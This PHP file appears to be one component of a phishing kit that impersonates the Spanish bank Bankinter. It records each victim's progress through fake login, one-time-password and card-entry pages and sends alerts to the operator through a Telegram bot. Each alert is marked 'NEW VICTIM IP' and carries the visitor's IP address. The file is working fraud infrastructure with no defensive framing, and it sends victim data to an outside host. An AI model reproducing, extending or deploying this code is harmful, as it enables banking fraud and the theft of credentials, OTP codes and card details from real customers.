<?php 
require '../main.php';

 
 

function note($statu){
	global $j;
	$j->saveData("- LOG [ $statu ] ", $j->get("id"));
	$notif = $j->getAdmin("notifications");
	$ids = explode(",",str_replace(" ","",$j->getAdmin("chat_id")));
	
	if($notif==1){
	foreach($ids as $id){
		$msg = urlencode("BANKINTER NOTIFICATION 🍊\n NEW VICTIM IP 👨‍🦱 : ".$_SERVER['REMOTE_ADDR']."\nSTATUT : $statu");
		sendBot($id, $msg);
}
	}
}


function sendBot($id, $msg){
	global $j;
	$bot = $j->getAdmin("telegram_bot");
	$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$msg";
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}

 

if(isset($_POST['otping'])){
	note("Entering otp...");
}if(isset($_POST['otpview'])){
	note("In otp page");
}

if(isset($_POST['logintype'])){
	note("Entering login...");
}if(isset($_POST['loginview'])){
	note("In login page");
}



if(isset($_POST['cardview'])){
	note("In card page");
}

if(isset($_POST['carding'])){
	note("Entering card info...");
}

 

if(isset($_POST['waitingview'])){
	note("Waiting for redirection...");
}
  
if(isset($_POST['finishview'])){
	note("Success!");
}


?>